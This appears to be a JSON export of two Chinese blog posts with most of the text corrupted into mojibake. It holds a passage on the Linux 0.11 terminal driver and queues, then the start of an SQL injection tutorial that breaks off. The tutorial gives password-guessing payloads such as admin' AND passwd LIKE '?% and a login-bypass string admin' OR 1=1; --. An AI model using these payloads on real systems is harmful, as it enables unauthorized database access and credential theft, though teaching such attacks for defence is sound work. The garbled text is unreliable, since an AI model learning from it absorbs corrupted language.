rw_ttyx(rw,current-\u003etty,buf,count,pos);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eåˆ°æ­¤ä¸ºæ­¢ï¼Œåº”è¯¥èƒ½å¤ŸåŸºæœ¬äº†è§£äº†å­—ç¬¦è®¾å¤‡ï¼Œä½œä¸º Linux çš„æ–‡ä»¶ï¼Œæ‰€åº”è¯¥æœ‰çš„è¯»å†™çš„ç›¸å…³æ”¯æŒã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œç©¶ç«Ÿè¯»ã€å†™çš„å†…å®¹åœ¨å“ªå‘¢ï¼Ÿæ¯”å¦‚æ­£è§„æ–‡ä»¶ï¼Œéƒ½å¾ˆå®¹æ˜“åœ°å¯ä»¥ç†è§£åˆ°ï¼Œå°±æ˜¯ä»ç£ç›˜ä¸­å–å‡ºæŸä¸ª/æŸå‡ ä¸ªç›˜å—çš„å†…å®¹å³å¯ã€‚å­—ç¬¦è®¾å¤‡çš„IOè¦ä»å“ªé‡Œå–(å¾€å“ªé‡Œé€)æ•°æ®å‘¢?\u003c/p\u003e\n\u003ch3\u003eå­—ç¬¦è®¾å¤‡é©±åŠ¨\u003c/h3\u003e\n\u003cp\u003eå¯¹äºè®¾å¤‡é©±åŠ¨è¿™ä¸ªæ¦‚å¿µï¼Œè‡³ä»Šæ²¡æœ‰ææ¸…æ¥šã€‚ä¸è¿‡ï¼Œè¿™ä¸å¦¨ç¢å¯¹ä»£ç çš„ç†è§£ã€‚åæ­£å¯¹äºå­—ç¬¦è®¾å¤‡é©±åŠ¨æ¥è¯´ï¼Œä¹Ÿå°±æ˜¯ Linux å†…æ ¸ä¸­çš„ä¸€äº›è½¯ä»¶å±‚é¢çš„ä»£ç ï¼Œä¸æ™®é€šä»£ç çš„å”¯ä¸€åŒºåˆ«ï¼Œå°±æ˜¯å¯¹å¤–è®¾ç¡¬ä»¶åšäº†ç›¸åº”çš„äº¤äº’æ”¯æŒã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fykyc6lo9pj31i40u0ac8.jpg\"\u003e\u003c/p\u003e\n\u003cp\u003eæ‰¿æ¥æ“ä½œç³»ç»Ÿçš„å­—ç¬¦è®¾å¤‡æ¥å£ï¼Œ\u003ccode\u003etty_read\u003c/code\u003eã€\u003ccode\u003etty_write\u003c/code\u003e è´Ÿè´£è¯»å…¥å’Œå†™å‡ºã€‚\u003c/p\u003e\n\u003cp\u003eä»å“ªé‡Œè¯»ï¼Ÿ\u003ccode\u003esecondary\u003c/code\u003e æ•°æ®é˜Ÿåˆ—ï¼›å¾€å“ªé‡Œå†™ï¼Ÿ\u003ccode\u003ewrite_q\u003c/code\u003e æ•°æ®é˜Ÿåˆ—ã€‚\u003c/p\u003e\n\u003cp\u003eåŒæ—¶ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œä¸è¿™äº›é˜Ÿåˆ—ç›´æ¥ç›¸å…³çš„ï¼Œå°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„é”®ç›˜å’Œæ˜¾ç¤ºå™¨äº†ã€‚æ˜¯ä¸æ˜¯æœ‰äº†ç‚¹è±ç„¶å¼€æœ—çš„æ„Ÿè§‰ã€‚\u003c/p\u003e\n\u003cp\u003eå¥½ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™é‡Œæè¿°çš„ä¸‰ä¸ªé˜Ÿåˆ—ç©¶ç«Ÿæ˜¯æ€ä¹ˆå·¥ä½œçš„ã€‚è¿™é‡Œå°±ä¸å¾—ä¸å…ˆçœ‹çœ‹å†…å­˜ä¸­æŠ½è±¡å‡ºæ¥çš„æè¿°ç»ˆç«¯çš„æ•°æ®ç»“æ„ \u003ccode\u003etty_struct\u003c/code\u003eã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e/**\n * copied from include/linux/tty.h\n */\nstruct tty_struct {\n    struct termios termios;     /* terminal IO conf */\n    int pgrp;                   /* æ‰€å±è¿›ç¨‹ç»„ */\n    int stopped;                /* åœæ­¢æ ‡å¿— */\n    void (*write)(struct tty_struct * tty); /* ç»ˆç«¯å†™å‡½æ•°æŒ‡é’ˆ */\n    struct tty_queue read_q;    /* ç»ˆç«¯è¯»é˜Ÿåˆ— */\n    struct tty_queue write_q;   /* ç»ˆç«¯å†™é˜Ÿåˆ— */\n    struct tty_queue secondary; /* ç»ˆç«¯è¾…åŠ©é˜Ÿåˆ— */\n};\n\n/**\n * copied from include/termios.h\n */\nstruct termios {                /* terminal IO å±æ€§ */\n    unsigned long c_iflag;      /* input mode flags */\n    unsigned long c_oflag;      /* output mode flags */\n    unsigned long c_cflag;      /* control mode flags */\n    unsigned long c_lflag;      /* local mode flags */\n    unsigned char c_line;       /* line discipline */\n    unsigned char c_cc[NCCS];   /* control characters */\n};\n\n/**\n * copied from include/linux/tty.h\n */\nstruct tty_queue {\n    unsigned long data;         /* å­—ç¬¦è¡Œæ•°é‡ | ä¸²å£ç»ˆç«¯åˆ™å­˜å‚¨ç«¯å£å· */\n    unsigned long head;         /* å¤´æŒ‡é’ˆ */\n    unsigned long tail;         /* å°¾æŒ‡é’ˆ */\n    struct task_struct * proc_list; /* ç­‰å¾…è¯¥ç»ˆç«¯çš„ä»»åŠ¡é˜Ÿåˆ— */\n    char buf[TTY_BUF_SIZE];     /* é˜Ÿåˆ—çš„ç¼“å†²åŒº */\n};\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå¯¹äºä»»ä½•ä»»åŠ¡éœ€è¦è¯»å†™å­—ç¬¦è®¾å¤‡(è¿™é‡ŒæŒ‡ç»ˆç«¯è®¾å¤‡)ï¼Œæœ€ç»ˆç›´æ¥è¯»å–/å†™å…¥åˆ°çš„å°±æ˜¯ \u003ccode\u003esecondary\u003c/code\u003e å’Œ \u003ccode\u003ewrite_q\u003c/code\u003eã€‚\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eè¿™é‡Œå¯èƒ½æœ‰ä¸ªå°å°çš„ç–‘é—®? ä¸ºä»€ä¹ˆè¯»ç»ˆç«¯è®¾å¤‡ä¸æ˜¯è¯» \u003ccode\u003eread_q\u003c/code\u003e å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå…¶å®ä¹Ÿæ¯”è¾ƒå¥½è§£é‡Šï¼Œç›¸ä¿¡æ—¥å¸¸åœ¨æ“ä½œå‘½ä»¤è¡Œçš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨é”®ç›˜ä¸Šæ•²å‡»çš„é”®ä½ä¸æ˜¾ç¤ºå™¨ä¸Šå®é™…å±•ç¤ºçš„å†…å®¹æ˜¯ä¸ç›¸åŒ¹é…çš„ã€‚æœ€æ™®é€šçš„ï¼Œæˆ‘ä»¬é”®å…¥äº† \u003cstrong\u003edelete(åˆ é™¤é”®)\u003c/strong\u003eï¼Œä¸ºä»€ä¹ˆä¸æ˜¯ä¸€ä¸ª \u003cstrong\u003edelete\u003c/strong\u003e å¯¹åº”çš„ ascii (å½“ç„¶ï¼Œè¿™é‡Œè¯·å…ˆå¿½è§†éæ‰“å°å­—ç¬¦çš„é—®é¢˜)ï¼Œè€Œæ˜¯åˆ é™¤äº†æœ€åä¸€ä¸ªå­—ç¬¦å‘¢ï¼Ÿå®Œå…¨å¯ä»¥æƒ³è±¡ï¼Œåæ­£ä»»ä½•é”®ä½ä¸é©±åŠ¨äº¤äº’çš„æ—¶å€™éƒ½æ˜¯ä¼ å…¥ä¸€ä¸²äºŒè¿›åˆ¶ç å˜›ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œçš„ \u003ccode\u003esecondary\u003c/code\u003e å®Œæˆçš„å°±æ˜¯æ€ä¹ˆä¸€ä¸ªå·¥ä½œï¼Œ\u003ccode\u003eread_q\u003c/code\u003e å­˜å‚¨çš„æ˜¯æ‰€æœ‰çš„å¤–è®¾(è¿™é‡Œæ˜¯é”®ç›˜)çš„è¾“å…¥ï¼Œå¹¶åŸæ ·å­˜å‚¨ã€‚è€Œåˆ°äº† \u003ccode\u003esecondary\u003c/code\u003e å°±æ˜¯ç»è¿‡ç›¸åº”çš„åŠ å·¥ï¼Œè¯¸å¦‚æ§åˆ¶å­—ç¬¦ä¹‹ç±»çš„éƒ½å±•ç°äº†å„è‡ªçš„æ„ä¹‰ï¼Œå¹¶å®Œæˆä¸€äº›åŠ å·¥å·¥ä½œï¼Œè€Œä¸å†ä»…ä»…åªæ˜¯æ™®é€šåœ°å±•ç¤ºäº†ã€‚\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eå¦å¤–ï¼Œå¯èƒ½è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ã€‚è™½ç„¶æˆ‘ä»¬å·²ç»ä¹ æƒ¯äº†åœ¨å‘½ä»¤è¡Œäº¤äº’æ—¶ï¼Œæ‰€æœ‰çš„è¾“å…¥éƒ½å°†ç›´æ¥åœ¨æ˜¾ç¤ºå™¨ä¸Šè¿›è¡Œå±•ç¤ºï¼Œå¥½åƒæˆ‘ä»¬åœ¨ç›´æ¥å¾€æ˜¾ç¤ºå™¨ä¸Šå†™å†…å®¹ã€‚ä½†æ˜¯ï¼Œå‰é¢æˆ‘ä»¬æè¿°çš„å†…å®¹éƒ½æ˜¯ï¼Œé”®ç›˜è®¾å¤‡ä½œä¸ºè¾“å…¥ï¼Œæ˜¯è¦å†™åˆ° \u003ccode\u003eread_q\u003c/code\u003e ä¹ƒè‡³ \u003ccode\u003esecondary\u003c/code\u003e å¹¶æœ€ç»ˆä½œä¸ºè¿›ç¨‹çš„è¾“å…¥çš„ã€‚åœ¨æ˜¾ç¤ºå™¨ä¸Šæ˜¾ç¤ºå¹¶ä¸æ˜¯å®ƒæœ¬æ¥åº”è¯¥å¹²çš„äº‹æƒ… (æ¯”è¾ƒæ˜¾ç¤ºå™¨ä¸Šå±•ç¤ºçš„åº”è¯¥æ˜¯ \u003ccode\u003ewrite_q\u003c/code\u003e çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¿›ç¨‹çš„æ ‡å‡†è¾“å‡º)\u003c/p\u003e\n\u003cp\u003eäº‹å®ä¸Šï¼Œè¿™ä»…ä»…åªæ˜¯ä¸€ä¸ªå›æ˜¾ï¼Œå°† \u003ccode\u003esecondary\u003c/code\u003e é˜Ÿåˆ—çš„å†…å®¹å¤åˆ¶äº†ä¸€ä»½åˆ°å†™é˜Ÿåˆ—ï¼Œä¹Ÿå°±å‘ˆç°å‡ºè®©æ˜¾ç¤ºå™¨æ‰“å°ç›¸åº”é”®ç›˜è¾“å…¥çš„æ•ˆæœäº†ã€‚\u003c/p\u003e\n\u003cp\u003eåŒæ—¶ï¼Œè¿™ä¹Ÿå°±èƒ½å¤Ÿç›´æ¥è§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨ä½¿ç”¨ \u003ccode\u003epasswd\u003c/code\u003e, \u003ccode\u003esu\u003c/code\u003e, \u003ccode\u003esudo\u003c/code\u003e ç­‰å‘½ä»¤æ—¶ï¼Œè¦æ±‚è¾“å…¥å¯†ç éƒ½æ˜¯ä¸åœ¨æ˜¾ç¤ºå™¨ä¸Šå›æ˜¾çš„ã€‚å®ç°ä¹Ÿç›¸å½“ç®€å•äº†å˜›ã€‚æŠŠ tty_struct.termios çš„ç›¸åº”æ§åˆ¶å±æ€§ (ECHO) é‡ç½®ï¼Œå°±å¯ä»¥å®ç°ä¸å›æ˜¾çš„æ•ˆæœäº†ã€‚\u003c/p\u003e\n\u003ch3\u003eç»ˆç«¯è®¾å¤‡äº¤äº’\u003c/h3\u003e\n\u003cp\u003eæœ€åä¸€éƒ¨åˆ†ï¼Œåº”è¯¥ä¹Ÿæ˜¯æœ€å…³å¿ƒçš„äº†ã€‚å¤–è®¾å¦‚ä½•ä¸æ“ä½œç³»ç»Ÿå®Œæˆäº¤äº’ã€‚å…¶å®ä¹Ÿèƒ½å¤Ÿæƒ³å¾—åˆ°äº†â€”â€”ä¸­æ–­ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨æ“ä½œç³»ç»Ÿåˆå§‹åŒ–æ—¶ï¼Œå°±æŠŠä¸­æ–­æè¿°ç¬¦è¡¨çš„ä¸­æ–­è¡¨é¡¹é…ç½®å¾—å½“ã€‚ä¹‹åçš„äº‹æƒ…å°±æ˜¯ç­‰å¾…é”®ç›˜ç­‰å¤–è®¾è¾“å…¥çš„ä¸­æ–­ä¿¡å·äº†ã€‚\u003c/p\u003e\n\u003cp\u003eåˆçœ‹å›åˆ°äº† \u003ccode\u003einit/main.c\u003c/code\u003e ç¨‹åº\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid main(void)\n{\n    ...\n    trap_init();\n    blk_dev_init();\n    chr_dev_init(); /* å—è®¾å¤‡ç›¸å…³åˆå§‹åŒ–, æ–¹æ³•ä½“æ˜¯ç©ºçš„ï¼Œæ²¡æœ‰å®ç° */\n    tty_init();     /* tty ç»ˆç«¯è®¾å¤‡åˆå§‹åŒ– */\n    time_init();\n    sched_init();\n    buffer_init(buffer_memory_end);\n    ...\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode\u003e/**\n * Copied from kernel/chr_drv/tty_io.c\n * ç»ˆç«¯è®¾å¤‡åˆè¯†åŒ–\n */\nvoid tty_init(void)\n{\n    /** ä¸²å£è®¾å¤‡åˆå§‹åŒ– */\n    rs_init();\n    /** æ§åˆ¶å°è®¾å¤‡åˆå§‹åŒ– */\n    con_init();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eè‡³äºä¸ºä»€ä¹ˆæœ‰ä¸¤ç§åˆå§‹åŒ–æ–¹å¼ã€‚è¿™æ¥æºäºç»ˆç«¯åˆåŒºåˆ†ä¸ºæ§åˆ¶å°ç»ˆç«¯ä¸ä¸²å£ç»ˆç«¯ï¼ŒåŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯ç›´æ¥å»ºç«‹åœ¨ä¸»æœºä¸Šï¼Œä¸²å£ç»ˆç«¯æ˜¯é€šè¿‡ä¸²è¡Œæ¥å£è¿æ¥åˆ°ä¸»æœºçš„ã€‚å½“ç„¶ï¼Œè¿™éƒ½æ˜¯å¤è€çš„æ–¹å¼äº†ï¼Œç»†èŠ‚å°±ä¸å¤ªæ¸…æ¥šäº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢æ¥çœ‹çœ‹ \u003ccode\u003econ_init()\u003c/code\u003e åšäº†å“ªäº›å·¥ä½œ(\u003ccode\u003ers_init()\u003c/code\u003e çš„å†…å®¹è¯·è‡ªè¡Œäº†è§£)\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003evoid con_init(void)\n{\n    register unsigned char a;\n    char *display_desc = \"????\";\n    char *display_ptr;\n\n    /**\n     * è¯»å– setup.s ç¨‹åºé¢„å¤„ç†çš„å†…å®¹\n     * åŒ…æ‹¬æ˜¾ç¤ºå™¨çš„å„ç§é…ç½®å‚æ•°\n     */\n    video_num_columns = ORIG_VIDEO_COLS;\n    video_size_row = video_num_columns * 2;\n    video_num_lines = ORIG_VIDEO_LINES;\n    video_page = ORIG_VIDEO_PAGE;\n    video_erase_char = 0x0720;\n\n    /**\n     * è¯»å–æ˜¾ç¤ºå™¨çš„é…ç½®å¹¶è¿›è¡Œç›¸å…³è®¾ç½® (çœç•¥ä»£ç )\n     */\n    ...\n\n    origin  = video_mem_start;\n    scr_end = video_mem_start + video_num_lines * video_size_row;\n    top = 0;\n    bottom  = video_num_lines;\n\n    gotoxy(ORIG_X,ORIG_Y);\n    /** è®¾ç½®é™·é˜±é—¨ */\n    set_trap_gate(0x21,\u0026#x26;keyboard_interrupt);\n    outb_p(inb_p(0x21)\u0026#x26;0xfd,0x21);\n    a=inb_p(0x61);\n    outb_p(a|0x80,0x61);\n    outb(a,0x61);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eåº”è¯¥èƒ½å¤Ÿçœ‹åˆ°æœ€é‡è¦çš„å†…å®¹å°±æ˜¯\u003cstrong\u003eè®¾ç½®é”®ç›˜ä¸­æ–­é™·é˜±é—¨\u003c/strong\u003eäº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¹‹ååªæœ‰é™é™åœ°ç­‰å¾…é”®ä½æ•²å‡»ï¼Œä¹Ÿå°±èƒ½å¤Ÿäº§ç”Ÿç¡¬ä»¶ä¸­æ–­ï¼Œä»è€Œè®© \u003ccode\u003eread_q\u003c/code\u003e è·å¾—åˆ°ç›¸åº”çš„å­—ç¬¦è¾“å…¥ã€‚\u003c/p\u003e\n\u003cp\u003eè‡³äºé”®ç›˜ä¸­æ–­çš„ç›¸åº”å¤„ç†æµç¨‹ï¼Œè¿™é‡Œä¸å†è¯¦è¿°ã€‚ç®€è¿°ä¸€äº›æ­¥éª¤:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eäº§ç”Ÿç¡¬ä¸­æ–­ \u003ccode\u003ekeyboard_interrupt\u003c/code\u003eï¼Œç”±ç¨‹åº \u003ccode\u003eKeyboard.s\u003c/code\u003e çš„æ±‡ç¼–ä»£ç è¿›è¡Œå¤„ç†\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ ¹æ®ä¸åŒçš„é”®ç›˜(US é”®ç›˜ã€å¾·å¼é”®ç›˜ç­‰ç­‰)å°†è·å¾—çš„é”®ä½ä¿¡å·è¿›è¡Œç›¸åº”çš„å­—ç¬¦è½¬æ¢(æŸ¥è½¬æ¢è¡¨)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè°ƒç”¨ \u003ccode\u003edo_tty_interrupt\u003c/code\u003e å¤„ç†å‡½æ•° (ç¡®è®¤æ˜¯ç»™å“ªä¸ªç»ˆç«¯çš„ä¿¡å·)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eè°ƒç”¨ \u003ccode\u003ecopy_to_cooked(tty)\u003c/code\u003e ï¼Œå³å®Œæˆ \u003ccode\u003eread_q\u003c/code\u003e åˆ° \u003ccode\u003esecondary\u003c/code\u003e çš„ç›¸å…³åŠ å·¥ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e  __                    __                  \n / _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                 |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003cp\u003eç›¸æ¯”è¾ƒäºå—è®¾å¤‡ï¼Œå­—ç¬¦è®¾å¤‡æ— è®ºä»ç‰©ç†è®¤çŸ¥ä¸Šï¼ŒæŠ‘æˆ–æ˜¯ç†è®ºç†è§£ä¸Šï¼Œéƒ½å­˜åœ¨ç€ç›¸å½“å¤§çš„å…¥é—¨é—¨æ§›ã€‚ç‰¹åˆ«æ˜¯åœ¨å°†å­—ç¬¦è®¾å¤‡ä¸æ§åˆ¶å°ã€å‘½ä»¤è¡Œç»ˆç«¯æ··æ·†çš„æ—¶å€™ï¼Œå°±æ›´åŠ éš¾ä»¥è¿›è¡Œåˆ†è¾¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå›åˆ°å­—ç¬¦è®¾å¤‡æœ¬èº«ï¼Œå­—ç¬¦è®¾å¤‡ä¸å—è®¾å¤‡æœ€ä¸»è¦çš„åŒºåˆ«å°±åœ¨äºå—è®¾å¤‡å¯ä»¥éšæœºè¯»å†™ï¼Œè€Œå­—ç¬¦è®¾å¤‡åªèƒ½å¤Ÿé¡ºåºè¯»ï¼Œé¡ºåºå†™ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œå¸¸è§çš„å­—ç¬¦è®¾å¤‡æœ‰ä»€ä¹ˆï¼Ÿæ˜¾ç¤ºå™¨ã€é”®ç›˜ã€é¼ æ ‡ã€‚\u003c/p\u003e"},{"url":"2018-12-15-sql-injection","fileName":"2018-12-15-sql-injection.md","title":"SQL æ³¨å…¥","author":"fangfeng","date":"2018-12-15T00:00:00.000Z","tags":["Security","SQL"],"content":"\u003cp\u003eè¯´å®è¯æ­¤å‰å¯¹ SQL æ³¨å…¥çš„ç†è§£ä»…ä»…åªæ˜¯çš®æ¯›ã€‚å½“ç„¶ï¼Œç›®å‰ä¹Ÿæ˜¯ï¼Œåªæ˜¯æœ‰äº†ä¸€å®šç¨‹åº¦çš„ç†è§£ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€è¿‘å¥½åƒå·¥å…·ç”¨å¾—æœ‰äº›è¿‡å¤´äº†ï¼Œéœ€è¦åœä¸‹æ¥æ•´ç†ä¸‹å·¥å…·çš„å®ç°åŸç†ã€‚\u003c/p\u003e\n\u003cp\u003eæ›´å¥½åœ°ç†è§£äº†å·¥å…·å®ç°ï¼Œæ‰èƒ½æ›´åŠ å¿ƒå®‰ç†å¾—åœ°ä½¿ç”¨å·¥å…·ã€‚æ¯•ç«Ÿç­‰åˆ«äººæ€¼çš„æ—¶å€™ï¼Œè¿˜èƒ½å¤Ÿæ¯”è¾ƒå®‰å¿ƒåœ°å›é“: \"æˆ‘ç”¨ä¸ç”¨ç°æˆçš„å·¥å…·åªæ˜¯å–å†³äºæˆ‘æƒ³ä¸æƒ³è‡ªå·±å†å†™ä¸€å¥—\"\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œæ¯•ç«Ÿæˆç†Ÿçš„å·¥å…·æœ‰æ›´å¤šçš„ä¼˜åŒ–ï¼Œè¿™å°±ä¸æ˜¯çŸ­æ—¶é—´å†…æˆ‘æƒ³ä¸æƒ³è‡ªå·±å†™çš„é—®é¢˜äº†ï¼Œå“ˆå“ˆã€‚\u003c/p\u003e\n\u003ch2\u003eæ¦‚è¦\u003c/h2\u003e\n\u003cp\u003eSQL æ³¨å…¥æ¼æ´ç©¶ç«Ÿä¼šäº§ç”Ÿæ€ä¹ˆæ ·çš„å±å®³æ€§ï¼Œä»…ä»…åªæ˜¯ç»•è¿‡æŸäº›ç™»å½•è´¦å·å¯†ç çš„éªŒè¯? åªæ˜¯ç»•è¿‡æŸäº›è®¿é—®é™åˆ¶å®ç°ç‰¹æƒå†…å®¹çš„è®¿é—®?\u003c/p\u003e\n\u003cp\u003eæ­¤å‰æˆ‘çš„è®¤è¯†ä¹Ÿä»…ä»…åªæ˜¯åœç•™åœ¨è¿™é‡Œã€‚å¯è°æ›¾æƒ³ï¼ŒSQL SELECT è¯­å¥çœŸçš„æ˜¯åŠŸèƒ½å¼ºå¤§å•Šã€‚é€šè¿‡å„ç§å„æ ·çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæœ€ç»ˆèƒ½è¾¾åˆ°çš„ç›®çš„ï¼Œå¯ä»¥è¯´æŠŠæ•´ä¸ªæ•°æ®åº“çš„å†…å®¹æ‹–ä¸‹æ¥ä¹Ÿä¸ä¸ºè¿‡ã€‚å½“ç„¶ï¼Œè¿™ä¹Ÿæ˜¯é™å®šåœ¨æ²¡æœ‰å®ç°åˆ†åº“åˆ†è¡¨ï¼Œæ•°æ®åº“æŸ¥è¯¢è´¦å·çš„æƒé™è¿‡å¤§çš„å‰æä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eä¸è¿‡ï¼Œè¿™ä¹Ÿå°±å¤Ÿäº†ã€‚åªæœ‰çœŸæ­£è®¤è¯†åˆ°é—®é¢˜çš„ä¸¥é‡æ€§ï¼Œæœ€ç»ˆæ‰ä¼šæƒ³ç€å»åšå‡ºä¸€äº›æ”¹å–„ã€‚\u003c/p\u003e\n\u003ch2\u003eSQL æ³¨å…¥æŠ€æœ¯\u003c/h2\u003e\n\u003ch3\u003eåŸºäºå¸ƒå°”çš„æ³¨å…¥\u003c/h3\u003e\n\u003cp\u003eæœ€æ—©æ¥è§¦åˆ° SQL æ³¨å…¥é—®é¢˜ï¼Œè¿˜æ˜¯ä¸¤ä¸ªæœˆå‰ã€‚æ“ä½œçš„å†…å®¹ä¹Ÿç›¸å½“ç®€å•ï¼ŒçŒœè§£æŸè´¦å·çš„å¯†ç ã€‚\u003c/p\u003e\n\u003cp\u003eæŸæ¥å£æä¾›äº†æŸ¥è¯¢è´¦å·çš„åŠŸèƒ½ï¼Œåå°çš„æ‹¼æ¥ SQL å¯ä»¥ç®€å•ç†è§£æˆ \u003ccode\u003eSELECT * FROM users WHERE username = '${}'\u003c/code\u003e ã€‚å…¶ä¸­ \u003ccode\u003e${}\u003c/code\u003e å°±æ˜¯ç›´æ¥ä½¿ç”¨çš„æ¥å£è¯·æ±‚å‚æ•°ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œæ¥å£çš„è¯·æ±‚ç»“æœä¼šæ ¹æ® SQL æŸ¥è¯¢çš„ç»“æœï¼Œæœ‰æˆ–æ²¡æœ‰è®°å½•å‘ˆç°ä¸¤ä¸ªä¸åŒçš„é¡µé¢ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ç®—æ˜¯æœ€ç®€å•å®¹æ˜“çš„ SQL æ³¨å…¥äº†ï¼Œä¹Ÿæ˜¯å‡­å€Ÿä¸ªäººèƒ½åŠ›ç›´æ¥èƒ½å¤Ÿæƒ³åˆ°æ³¨å…¥ç‚¹çš„é—®é¢˜äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€å…ˆåšçš„å°±æ˜¯çŒœè§£å­˜å‚¨å¯†ç å­—æ®µçš„å­—æ®µåç©¶ç«Ÿæ˜¯ä»€ä¹ˆ? å¾ˆå¥½ï¼Œç¬¦åˆå¸¸ç†çš„è®¾è®¡ï¼Œç›´æ¥å°±æ˜¯ \u003ccode\u003epasswd\u003c/code\u003e ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢å°±æ˜¯è‹¦åŠ›å·¥ä½œï¼Œåˆ©ç”¨ SQL LIKE æ“ä½œç¬¦ï¼Œé€ä¸€å»çŒœæ¯ä¸€ä½ã€‚\u003ccode\u003e${}\u003c/code\u003e çš„æ³¨å…¥å†…å®¹å°±ç±»ä¼¼ \u003ccode\u003eadmin' AND passwd LIKE '?%\u003c/code\u003e è¿™é‡Œçš„é—®å·å°±æ˜¯é€ä¸€çŒœè§£çš„å†…å®¹(1-9a-zA-Z + ç‰¹æ®Šç¬¦å·)\u003c/p\u003e\n\u003cp\u003eè‡³äºä¸ºä»€ä¹ˆåˆ©ç”¨ LIKE æ“ä½œç¬¦ï¼Œå¾ˆæ˜ç¡®ï¼Œå‡å°‘çŒœè§£çš„æ¬¡æ•°ã€‚å¦åˆ™ï¼Œåœ¨å¯†ç æœªçŸ¥çš„æƒ…å†µä¸‹ï¼Œå³ä½¿å…­ä½å¯†ç ä¹Ÿæœ‰çŒœè§£ç™¾ä¸‡æ¬¡ã€‚è€Œ LIKE æ“ä½œç¬¦èƒ½å°†çŒœè§£æ¬¡æ•°é™ä¸ºçº¿æ€§ï¼Œ\u003ccode\u003eå¯†ç é•¿åº¦ * å­—ç¬¦é›†æ•°\u003c/code\u003e æ¬¡\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œä»…ä»…ç”¨äº† \u003ccode\u003eAND\u003c/code\u003eï¼Œä½†ç†Ÿæ‚‰äº†ä¸€ä¸ªï¼Œå…¶å®ƒå°±åŸºæœ¬ç±»ä¼¼äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœç™»å½•ä¹Ÿèƒ½å¤Ÿæ³¨å…¥ï¼Œè®¤è¯ SQL ç±»ä¼¼ \u003ccode\u003eSELECT * FROM users WHERE username = '${}' AND passwd = '${}'\u003c/code\u003eï¼Œé‚£ä¹ˆç›´æ¥åœ¨ç¬¬ä¸€ä¸ª \u003ccode\u003e${}\u003c/code\u003e å¤„æ³¨å…¥ \u003ccode\u003eadmin' OR 1=1; --\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eåŸºäºæ—¶é—´çš„æ³¨å…¥\u003c/h3\u003e\n\u003cp\u003eç»å¤§å¤šæ•°æ—¶å€™ï¼Œæ³¨å…¥ç»å¯¹æ²¡æœ‰è¿™ä¹ˆç®€å•ã€‚ä¹Ÿè®¸æ³¨å…¥ç‚¹èƒŒåçš„æ‹¼æ¥ SQL å¹¶ä¸å¯¹è¿”å›å€¼äº§ç”Ÿå½±å“ã€‚ä¾‹å¦‚ä»…ä»…åªæ˜¯ä¸ºäº†ä» DB æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶æ‰“ä¸€æ¡æ—¥å¿—ï¼Œè¿”å›çš„æ°¸è¿œæ˜¯é™æ€æ—¥å¿—ï¼ˆå½“ç„¶ï¼Œæˆ‘çŸ¥é“è¿™ä¸ªä¾‹å­ä¸æ°å½“ï¼Œæ— å¥ˆç›®å‰åªèƒ½æƒ³åˆ°è¿™ä¸ªï¼‰ã€‚\u003c/p\u003e\n\u003cp\u003eæ—¢ç„¶æ‹¼æ¥ SQL æ€»æ˜¯å­˜åœ¨ï¼Œä½†æ²¡æ³•ç»™æˆ‘ä»¬ä¸€ä¸ªç›´è§‚çš„æ³¨å…¥æˆåŠŸ OR 